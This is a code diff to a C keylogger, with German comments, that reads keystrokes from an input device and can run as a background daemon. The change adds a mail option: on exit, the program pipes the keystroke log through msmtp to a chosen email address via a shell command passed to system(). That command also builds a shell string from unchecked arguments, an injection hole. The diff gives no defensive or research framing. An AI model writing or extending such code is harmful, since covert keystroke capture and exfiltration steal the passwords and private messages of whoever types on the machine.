@@ -14,12 +14,14 @@
 #include <errno.h>
 #include <time.h>
 
-#define VERSION "1.1"
+#define VERSION "1.5"
 
 // Globale Variablen für Signal-Handling
 volatile sig_atomic_t running = 1;
 FILE *logfile = NULL;
 int input_fd = -1;
+char *email_address = NULL;
+char *global_logfilepath = NULL;
 
 void handle_signal(int signum) {
     running = 0;
@@ -38,6 +40,17 @@ void cleanup() {
     if (input_fd != -1) {
         close(input_fd);
         input_fd = -1;
+    }
+    
+    // Email senden, falls konfiguriert
+    if (email_address && global_logfilepath) {
+        char command[1024];
+        // Construct command with Subject header
+        // Format: (echo "Subject: ..."; echo; cat logfile) | msmtp email
+        snprintf(command, sizeof(command), 
+                 "(echo \"Subject: Keylog %s\"; echo; cat \"%s\") | msmtp \"%s\"", 
+                 VERSION, global_logfilepath, email_address);
+        system(command);
     }
 }
 
@@ -254,6 +267,8 @@ int main(int argc, char *argv[]) {
         } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0) {
             printf("Keylogger Version: "VERSION"\n");
             return 0;
+        } else if ((strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--mail") == 0) && i + 1 < argc) {
+            email_address = argv[++i];
         } else if (argv[i][0] != '-') {
             if (positional_args < 2) {
                 pos_args[positional_args++] = argv[i];
@@ -275,12 +290,13 @@ int main(int argc, char *argv[]) {
         eventfile = pos_args[0];
         logfilepath = pos_args[1];
     } else {
-        printf("USAGE: %s [-d] [path-to-event-file] <path-to-log-file>\n", argv[0]);
+        printf("USAGE: %s [-d] [-m email] [path-to-event-file] <path-to-log-file>\n", argv[0]);
         return 1;
     }
 
     // Pfad für Logfile absolut machen (einfacher Hack), falls Daemon Mode, 
     // da Daemon chdir("/") macht.
+    // Wir machen das jetzt unten nach dem Öffnen mit realpath().
     // Aber: Wir öffnen File *vor* Daemonize, also passt der Pfad relativ noch.
     // Filepointer bleibt offen.
 
@@ -295,6 +311,14 @@ int main(int argc, char *argv[]) {
         perror("fopen logfile");
         return -1;
     }
+    
+    // Resolve absolute path for msmtp usage (especially for daemon mode)
+    global_logfilepath = realpath(logfilepath, NULL);
+    if (!global_logfilepath) {
+        // Fallback, should unlikely settle here if fopen succeeded
+        global_logfilepath = logfilepath; 
+    }
+
     setbuf(logfile, NULL); // Unbuffered, oder fflush manuell
 
     printf("Benutze Device: %s\n", eventfile);
